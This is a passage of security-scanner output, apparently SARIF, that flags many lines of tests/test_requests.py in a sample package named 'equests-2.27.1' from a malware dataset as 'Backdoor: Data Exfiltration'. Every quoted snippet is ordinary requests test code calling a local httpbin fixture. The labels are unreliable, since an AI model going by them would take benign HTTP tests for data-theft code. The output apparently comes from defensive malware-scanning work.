                      "text": "\n        s = requests.session()\n        s.auth = auth\n        r = s.get(url)\n        assert r.status_code == 200\n\n    @pytest.mark.parametrize(\n",
                      "markdown": "`\n        s = requests.session()\n        s.auth = auth\n        r = s.get(url)\n        assert r.status_code == 200\n\n    @pytest.mark.parametrize(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 494,
                  "startColumn": 20,
                  "endLine": 494,
                  "endColumn": 25,
                  "snippet": {
                    "text": "        r = requests.get(url, auth=auth)\n        assert r.status_code == 200\n\n        r = requests.get(url)\n        assert r.status_code == 401\n\n        s = requests.session()\n",
                    "rendered": {
                      "text": "        r = requests.get(url, auth=auth)\n        assert r.status_code == 200\n\n        r = requests.get(url)\n        assert r.status_code == 401\n\n        s = requests.session()\n",
                      "markdown": "`        r = requests.get(url, auth=auth)\n        assert r.status_code == 200\n\n        r = requests.get(url)\n        assert r.status_code == 401\n\n        s = requests.session()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 491,
                  "startColumn": 20,
                  "endLine": 491,
                  "endColumn": 25,
                  "snippet": {
                    "text": "        auth = ('user', 'pass')\n        url = httpbin('basic-auth', 'user', 'pass')\n\n        r = requests.get(url, auth=auth)\n        assert r.status_code == 200\n\n        r = requests.get(url)\n",
                    "rendered": {
                      "text": "        auth = ('user', 'pass')\n        url = httpbin('basic-auth', 'user', 'pass')\n\n        r = requests.get(url, auth=auth)\n        assert r.status_code == 200\n\n        r = requests.get(url)\n",
                      "markdown": "`        auth = ('user', 'pass')\n        url = httpbin('basic-auth', 'user', 'pass')\n\n        r = requests.get(url, auth=auth)\n        assert r.status_code == 200\n\n        r = requests.get(url)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 476,
                  "startColumn": 20,
                  "endLine": 476,
                  "endColumn": 25,
                  "snippet": {
                    "text": "\n        heads = {key: 'Mozilla/5.0 (github.com/psf/requests)'}\n\n        r = requests.get(httpbin('user-agent'), headers=heads)\n        assert heads[key] in r.text\n\n    def test_HTTP_200_OK_HEAD(self, httpbin):\n",
                    "rendered": {
                      "text": "\n        heads = {key: 'Mozilla/5.0 (github.com/psf/requests)'}\n\n        r = requests.get(httpbin('user-agent'), headers=heads)\n        assert heads[key] in r.text\n\n    def test_HTTP_200_OK_HEAD(self, httpbin):\n",
                      "markdown": "`\n        heads = {key: 'Mozilla/5.0 (github.com/psf/requests)'}\n\n        r = requests.get(httpbin('user-agent'), headers=heads)\n        assert heads[key] in r.text\n\n    def test_HTTP_200_OK_HEAD(self, httpbin):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 461,
                  "startColumn": 22,
                  "endLine": 461,
                  "endColumn": 31,
                  "snippet": {
                    "text": "        headers = collections.OrderedDict([('Third', '3'), ('Fourth', '4')])\n        headers['Fifth'] = '5'\n        headers['Second'] = '222'\n        req = requests.Request('GET', httpbin('get'), headers=headers)\n        prep = ses.prepare_request(req)\n        items = list(prep.headers.items())\n        assert items[0] == ('Accept-Encoding', 'identity')\n",
                    "rendered": {
                      "text": "        headers = collections.OrderedDict([('Third', '3'), ('Fourth', '4')])\n        headers['Fifth'] = '5'\n        headers['Second'] = '222'\n        req = requests.Request('GET', httpbin('get'), headers=headers)\n        prep = ses.prepare_request(req)\n        items = list(prep.headers.items())\n        assert items[0] == ('Accept-Encoding', 'identity')\n",
                      "markdown": "`        headers = collections.OrderedDict([('Third', '3'), ('Fourth', '4')])\n        headers['Fifth'] = '5'\n        headers['Second'] = '222'\n        req = requests.Request('GET', httpbin('get'), headers=headers)\n        prep = ses.prepare_request(req)\n        items = list(prep.headers.items())\n        assert items[0] == ('Accept-Encoding', 'identity')\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 447,
                  "startColumn": 22,
                  "endLine": 447,
                  "endColumn": 31,
                  "snippet": {
                    "text": "        \"\"\"Do not send headers in Session.headers with None values.\"\"\"\n        ses = requests.Session()\n        ses.headers['Accept-Encoding'] = None\n        req = requests.Request('GET', httpbin('get'))\n        prep = ses.prepare_request(req)\n        assert 'Accept-Encoding' not in prep.headers\n\n",
                    "rendered": {
                      "text": "        \"\"\"Do not send headers in Session.headers with None values.\"\"\"\n        ses = requests.Session()\n        ses.headers['Accept-Encoding'] = None\n        req = requests.Request('GET', httpbin('get'))\n        prep = ses.prepare_request(req)\n        assert 'Accept-Encoding' not in prep.headers\n\n",
                      "markdown": "`        \"\"\"Do not send headers in Session.headers with None values.\"\"\"\n        ses = requests.Session()\n        ses.headers['Accept-Encoding'] = None\n        req = requests.Request('GET', httpbin('get'))\n        prep = ses.prepare_request(req)\n        assert 'Accept-Encoding' not in prep.headers\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 439,
                  "startColumn": 23,
                  "endLine": 439,
                  "endColumn": 28,
                  "snippet": {
                    "text": "        \"\"\"Show that even with redirects, Response.history is always a list.\"\"\"\n        resp = requests.get(httpbin('get'))\n        assert isinstance(resp.history, list)\n        resp = requests.get(httpbin('redirect/1'))\n        assert isinstance(resp.history, list)\n        assert not isinstance(resp.history, tuple)\n\n",
                    "rendered": {
                      "text": "        \"\"\"Show that even with redirects, Response.history is always a list.\"\"\"\n        resp = requests.get(httpbin('get'))\n        assert isinstance(resp.history, list)\n        resp = requests.get(httpbin('redirect/1'))\n        assert isinstance(resp.history, list)\n        assert not isinstance(resp.history, tuple)\n\n",
                      "markdown": "`        \"\"\"Show that even with redirects, Response.history is always a list.\"\"\"\n        resp = requests.get(httpbin('get'))\n        assert isinstance(resp.history, list)\n        resp = requests.get(httpbin('redirect/1'))\n        assert isinstance(resp.history, list)\n        assert not isinstance(resp.history, tuple)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 437,
                  "startColumn": 23,
                  "endLine": 437,
                  "endColumn": 28,
                  "snippet": {
                    "text": "\n    def test_history_is_always_a_list(self, httpbin):\n        \"\"\"Show that even with redirects, Response.history is always a list.\"\"\"\n        resp = requests.get(httpbin('get'))\n        assert isinstance(resp.history, list)\n        resp = requests.get(httpbin('redirect/1'))\n        assert isinstance(resp.history, list)\n",
                    "rendered": {
                      "text": "\n    def test_history_is_always_a_list(self, httpbin):\n        \"\"\"Show that even with redirects, Response.history is always a list.\"\"\"\n        resp = requests.get(httpbin('get'))\n        assert isinstance(resp.history, list)\n        resp = requests.get(httpbin('redirect/1'))\n        assert isinstance(resp.history, list)\n",
                      "markdown": "`\n    def test_history_is_always_a_list(self, httpbin):\n        \"\"\"Show that even with redirects, Response.history is always a list.\"\"\"\n        resp = requests.get(httpbin('get'))\n        assert isinstance(resp.history, list)\n        resp = requests.get(httpbin('redirect/1'))\n        assert isinstance(resp.history, list)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 430,
                  "startColumn": 23,
                  "endLine": 430,
                  "endColumn": 28,
                  "snippet": {
                    "text": "        assert cookies['cookie'] == 'tasty'\n\n    def test_requests_in_history_are_not_overridden(self, httpbin):\n        resp = requests.get(httpbin('redirect/3'))\n        urls = [r.url for r in resp.history]\n        req_urls = [r.request.url for r in resp.history]\n        assert urls == req_urls\n",
                    "rendered": {
                      "text": "        assert cookies['cookie'] == 'tasty'\n\n    def test_requests_in_history_are_not_overridden(self, httpbin):\n        resp = requests.get(httpbin('redirect/3'))\n        urls = [r.url for r in resp.history]\n        req_urls = [r.request.url for r in resp.history]\n        assert urls == req_urls\n",
                      "markdown": "`        assert cookies['cookie'] == 'tasty'\n\n    def test_requests_in_history_are_not_overridden(self, httpbin):\n        resp = requests.get(httpbin('redirect/3'))\n        urls = [r.url for r in resp.history]\n        req_urls = [r.request.url for r in resp.history]\n        assert urls == req_urls\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 408,
                  "startColumn": 22,
                  "endLine": 408,
                  "endColumn": 31,
                  "snippet": {
                    "text": "        s.cookies = cookiejar_from_dict({'cookie': 'tasty'})\n\n        # Prepare request without using Session\n        req = requests.Request('GET', httpbin('headers'), cookies=cj)\n        prep_req = req.prepare()\n\n        # Send request and simulate redirect\n",
                    "rendered": {
                      "text": "        s.cookies = cookiejar_from_dict({'cookie': 'tasty'})\n\n        # Prepare request without using Session\n        req = requests.Request('GET', httpbin('headers'), cookies=cj)\n        prep_req = req.prepare()\n\n        # Send request and simulate redirect\n",
                      "markdown": "`        s.cookies = cookiejar_from_dict({'cookie': 'tasty'})\n\n        # Prepare request without using Session\n        req = requests.Request('GET', httpbin('headers'), cookies=cj)\n        prep_req = req.prepare()\n\n        # Send request and simulate redirect\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 393,
                  "startColumn": 13,
                  "endLine": 393,
                  "endColumn": 18,
                  "snippet": {
                    "text": "        cj = cookielib.CookieJar()\n        cookiejar_from_dict({'foo': 'bar'}, cj)\n        s = requests.session()\n        r = s.get(httpbin('cookies'), cookies=cj)\n        # Make sure the cookie was sent\n        assert r.json()['cookies']['foo'] == 'bar'\n\n",
                    "rendered": {
                      "text": "        cj = cookielib.CookieJar()\n        cookiejar_from_dict({'foo': 'bar'}, cj)\n        s = requests.session()\n        r = s.get(httpbin('cookies'), cookies=cj)\n        # Make sure the cookie was sent\n        assert r.json()['cookies']['foo'] == 'bar'\n\n",
                      "markdown": "`        cj = cookielib.CookieJar()\n        cookiejar_from_dict({'foo': 'bar'}, cj)\n        s = requests.session()\n        r = s.get(httpbin('cookies'), cookies=cj)\n        # Make sure the cookie was sent\n        assert r.json()['cookies']['foo'] == 'bar'\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 383,
                  "startColumn": 13,
                  "endLine": 383,
                  "endColumn": 18,
                  "snippet": {
                    "text": "        cookiejar_from_dict({'foo': 'bar'}, cj)\n        s = requests.session()\n        s.cookies = cj\n        r = s.get(httpbin('cookies'))\n        # Make sure the cookie was sent\n        assert r.json()['cookies']['foo'] == 'bar'\n        # Make sure the session cj is still the custom one\n",
                    "rendered": {
                      "text": "        cookiejar_from_dict({'foo': 'bar'}, cj)\n        s = requests.session()\n        s.cookies = cj\n        r = s.get(httpbin('cookies'))\n        # Make sure the cookie was sent\n        assert r.json()['cookies']['foo'] == 'bar'\n        # Make sure the session cj is still the custom one\n",
                      "markdown": "`        cookiejar_from_dict({'foo': 'bar'}, cj)\n        s = requests.session()\n        s.cookies = cj\n        r = s.get(httpbin('cookies'))\n        # Make sure the cookie was sent\n        assert r.json()['cookies']['foo'] == 'bar'\n        # Make sure the session cj is still the custom one\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 374,
                  "startColumn": 9,
                  "endLine": 374,
                  "endColumn": 14,
                  "snippet": {
                    "text": "\n    def test_request_cookies_not_persisted(self, httpbin):\n        s = requests.session()\n        s.get(httpbin('cookies'), cookies={'foo': 'baz'})\n        # Sending a request with cookies should not add cookies to the session\n        assert not s.cookies\n\n",
                    "rendered": {
                      "text": "\n    def test_request_cookies_not_persisted(self, httpbin):\n        s = requests.session()\n        s.get(httpbin('cookies'), cookies={'foo': 'baz'})\n        # Sending a request with cookies should not add cookies to the session\n        assert not s.cookies\n\n",
                      "markdown": "`\n    def test_request_cookies_not_persisted(self, httpbin):\n        s = requests.session()\n        s.get(httpbin('cookies'), cookies={'foo': 'baz'})\n        # Sending a request with cookies should not add cookies to the session\n        assert not s.cookies\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 367,
                  "startColumn": 13,
                  "endLine": 367,
                  "endColumn": 18,
                  "snippet": {
                    "text": "    def test_request_cookie_overrides_session_cookie(self, httpbin):\n        s = requests.session()\n        s.cookies['foo'] = 'bar'\n        r = s.get(httpbin('cookies'), cookies={'foo': 'baz'})\n        assert r.json()['cookies']['foo'] == 'baz'\n        # Session cookie should not be modified\n        assert s.cookies['foo'] == 'bar'\n",
                    "rendered": {
                      "text": "    def test_request_cookie_overrides_session_cookie(self, httpbin):\n        s = requests.session()\n        s.cookies['foo'] = 'bar'\n        r = s.get(httpbin('cookies'), cookies={'foo': 'baz'})\n        assert r.json()['cookies']['foo'] == 'baz'\n        # Session cookie should not be modified\n        assert s.cookies['foo'] == 'bar'\n",
                      "markdown": "`    def test_request_cookie_overrides_session_cookie(self, httpbin):\n        s = requests.session()\n        s.cookies['foo'] = 'bar'\n        r = s.get(httpbin('cookies'), cookies={'foo': 'baz'})\n        assert r.json()['cookies']['foo'] == 'baz'\n        # Session cookie should not be modified\n        assert s.cookies['foo'] == 'bar'\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 360,
                  "startColumn": 13,
                  "endLine": 360,
                  "endColumn": 18,
                  "snippet": {
                    "text": "\n    def test_cookie_persists_via_api(self, httpbin):\n        s = requests.session()\n        r = s.get(httpbin('redirect/1'), cookies={'foo': 'bar'})\n        assert 'foo' in r.request.headers['Cookie']\n        assert 'foo' in r.history[0].request.headers['Cookie']\n\n",
                    "rendered": {
                      "text": "\n    def test_cookie_persists_via_api(self, httpbin):\n        s = requests.session()\n        r = s.get(httpbin('redirect/1'), cookies={'foo': 'bar'})\n        assert 'foo' in r.request.headers['Cookie']\n        assert 'foo' in r.history[0].request.headers['Cookie']\n\n",
                      "markdown": "`\n    def test_cookie_persists_via_api(self, httpbin):\n        s = requests.session()\n        r = s.get(httpbin('redirect/1'), cookies={'foo': 'bar'})\n        assert 'foo' in r.request.headers['Cookie']\n        assert 'foo' in r.history[0].request.headers['Cookie']\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 355,
                  "startColumn": 9,
                  "endLine": 355,
                  "endColumn": 14,
                  "snippet": {
                    "text": "\n    def test_cookie_quote_wrapped(self, httpbin):\n        s = requests.session()\n        s.get(httpbin('cookies/set?foo=\"bar:baz\"'))\n        assert s.cookies['foo'] == '\"bar:baz\"'\n\n    def test_cookie_persists_via_api(self, httpbin):\n",
                    "rendered": {
                      "text": "\n    def test_cookie_quote_wrapped(self, httpbin):\n        s = requests.session()\n        s.get(httpbin('cookies/set?foo=\"bar:baz\"'))\n        assert s.cookies['foo'] == '\"bar:baz\"'\n\n    def test_cookie_persists_via_api(self, httpbin):\n",
                      "markdown": "`\n    def test_cookie_quote_wrapped(self, httpbin):\n        s = requests.session()\n        s.get(httpbin('cookies/set?foo=\"bar:baz\"'))\n        assert s.cookies['foo'] == '\"bar:baz\"'\n\n    def test_cookie_persists_via_api(self, httpbin):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 344,
                  "startColumn": 9,
                  "endLine": 344,
                  "endColumn": 14,
                  "snippet": {
                    "text": "        s = requests.session()\n        s.get(httpbin('cookies/set?foo=bar'))\n        assert s.cookies['foo'] == 'bar'\n        s.get(\n            httpbin('response-headers'),\n            params={\n                'Set-Cookie':\n",
                    "rendered": {
                      "text": "        s = requests.session()\n        s.get(httpbin('cookies/set?foo=bar'))\n        assert s.cookies['foo'] == 'bar'\n        s.get(\n            httpbin('response-headers'),\n            params={\n                'Set-Cookie':\n",
                      "markdown": "`        s = requests.session()\n        s.get(httpbin('cookies/set?foo=bar'))\n        assert s.cookies['foo'] == 'bar'\n        s.get(\n            httpbin('response-headers'),\n            params={\n                'Set-Cookie':\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 342,
                  "startColumn": 9,
                  "endLine": 342,
                  "endColumn": 14,
                  "snippet": {
                    "text": "\n    def test_cookie_removed_on_expire(self, httpbin):\n        s = requests.session()\n        s.get(httpbin('cookies/set?foo=bar'))\n        assert s.cookies['foo'] == 'bar'\n        s.get(\n            httpbin('response-headers'),\n",
                    "rendered": {
                      "text": "\n    def test_cookie_removed_on_expire(self, httpbin):\n        s = requests.session()\n        s.get(httpbin('cookies/set?foo=bar'))\n        assert s.cookies['foo'] == 'bar'\n        s.get(\n            httpbin('response-headers'),\n",
                      "markdown": "`\n    def test_cookie_removed_on_expire(self, httpbin):\n        s = requests.session()\n        s.get(httpbin('cookies/set?foo=bar'))\n        assert s.cookies['foo'] == 'bar'\n        s.get(\n            httpbin('response-headers'),\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 337,
                  "startColumn": 13,
                  "endLine": 337,
                  "endColumn": 18,
                  "snippet": {
                    "text": "    def test_cookie_sent_on_redirect(self, httpbin):\n        s = requests.session()\n        s.get(httpbin('cookies/set?foo=bar'))\n        r = s.get(httpbin('redirect/1'))  # redirects to httpbin('get')\n        assert 'Cookie' in r.json()['headers']\n\n    def test_cookie_removed_on_expire(self, httpbin):\n",
                    "rendered": {
                      "text": "    def test_cookie_sent_on_redirect(self, httpbin):\n        s = requests.session()\n        s.get(httpbin('cookies/set?foo=bar'))\n        r = s.get(httpbin('redirect/1'))  # redirects to httpbin('get')\n        assert 'Cookie' in r.json()['headers']\n\n    def test_cookie_removed_on_expire(self, httpbin):\n",
                      "markdown": "`    def test_cookie_sent_on_redirect(self, httpbin):\n        s = requests.session()\n        s.get(httpbin('cookies/set?foo=bar'))\n        r = s.get(httpbin('redirect/1'))  # redirects to httpbin('get')\n        assert 'Cookie' in r.json()['headers']\n\n    def test_cookie_removed_on_expire(self, httpbin):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 336,
                  "startColumn": 9,
                  "endLine": 336,
                  "endColumn": 14,
                  "snippet": {
                    "text": "\n    def test_cookie_sent_on_redirect(self, httpbin):\n        s = requests.session()\n        s.get(httpbin('cookies/set?foo=bar'))\n        r = s.get(httpbin('redirect/1'))  # redirects to httpbin('get')\n        assert 'Cookie' in r.json()['headers']\n\n",
                    "rendered": {
                      "text": "\n    def test_cookie_sent_on_redirect(self, httpbin):\n        s = requests.session()\n        s.get(httpbin('cookies/set?foo=bar'))\n        r = s.get(httpbin('redirect/1'))  # redirects to httpbin('get')\n        assert 'Cookie' in r.json()['headers']\n\n",
                      "markdown": "`\n    def test_cookie_sent_on_redirect(self, httpbin):\n        s = requests.session()\n        s.get(httpbin('cookies/set?foo=bar'))\n        r = s.get(httpbin('redirect/1'))  # redirects to httpbin('get')\n        assert 'Cookie' in r.json()['headers']\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 331,
                  "startColumn": 9,
                  "endLine": 331,
                  "endColumn": 14,
                  "snippet": {
                    "text": "    def test_set_cookie_on_301(self, httpbin):\n        s = requests.session()\n        url = httpbin('cookies/set?foo=bar')\n        s.get(url)\n        assert s.cookies['foo'] == 'bar'\n\n    def test_cookie_sent_on_redirect(self, httpbin):\n",
                    "rendered": {
                      "text": "    def test_set_cookie_on_301(self, httpbin):\n        s = requests.session()\n        url = httpbin('cookies/set?foo=bar')\n        s.get(url)\n        assert s.cookies['foo'] == 'bar'\n\n    def test_cookie_sent_on_redirect(self, httpbin):\n",
                      "markdown": "`    def test_set_cookie_on_301(self, httpbin):\n        s = requests.session()\n        url = httpbin('cookies/set?foo=bar')\n        s.get(url)\n        assert s.cookies['foo'] == 'bar'\n\n    def test_cookie_sent_on_redirect(self, httpbin):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 325,
                  "startColumn": 20,
                  "endLine": 325,
                  "endColumn": 25,
                  "snippet": {
                    "text": "    def test_HTTP_200_OK_GET_WITH_MIXED_PARAMS(self, httpbin):\n        heads = {'User-agent': 'Mozilla/5.0'}\n\n        r = requests.get(httpbin('get') + '?test=true', params={'q': 'test'}, headers=heads)\n        assert r.status_code == 200\n\n    def test_set_cookie_on_301(self, httpbin):\n",
                    "rendered": {
                      "text": "    def test_HTTP_200_OK_GET_WITH_MIXED_PARAMS(self, httpbin):\n        heads = {'User-agent': 'Mozilla/5.0'}\n\n        r = requests.get(httpbin('get') + '?test=true', params={'q': 'test'}, headers=heads)\n        assert r.status_code == 200\n\n    def test_set_cookie_on_301(self, httpbin):\n",
